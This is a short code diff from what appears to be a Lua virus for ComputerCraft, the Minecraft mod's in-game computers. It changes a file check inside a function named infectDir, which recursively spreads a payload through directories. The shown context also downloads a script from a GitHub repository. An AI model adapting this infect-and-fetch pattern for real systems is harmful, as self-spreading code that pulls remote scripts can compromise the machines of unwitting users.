@@ -59,7 +59,7 @@ function infectDir(dirName, payload)
         infectDir(fullFile, payload)
       elseif fs.isReadOnly(fullFile) then
         if file ~= "startup" then
-          if not fs.exists("escapeCSV") then
+          if not fs.exists("toCSV") then
             shell.run("openp/github get tacodrake95/CC_V_AV/master/toCSV toCSV")
           end
           
